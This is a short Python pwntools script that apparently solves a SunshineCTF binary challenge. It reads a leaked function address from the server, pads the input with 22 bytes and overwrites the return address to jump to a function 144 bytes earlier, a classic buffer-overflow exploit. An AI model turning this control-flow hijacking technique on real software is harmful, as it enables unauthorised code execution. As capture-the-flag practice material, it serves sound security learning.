from pwn import *

#: Connect to challenge server
HOST = 'ret.sunshinectf.org' 
PORT = 4301
p = remote(HOST,PORT)
prompt = p.recv()

#: Exploit code
offset = 'A' * 22
welcome_addr = int(prompt.splitlines()[1].split()[-1],16)
mania_addr = p32(welcome_addr - 144)
exploit = offset + mania_addr

#: Send payload
p.sendline(exploit)
print(p.recv())

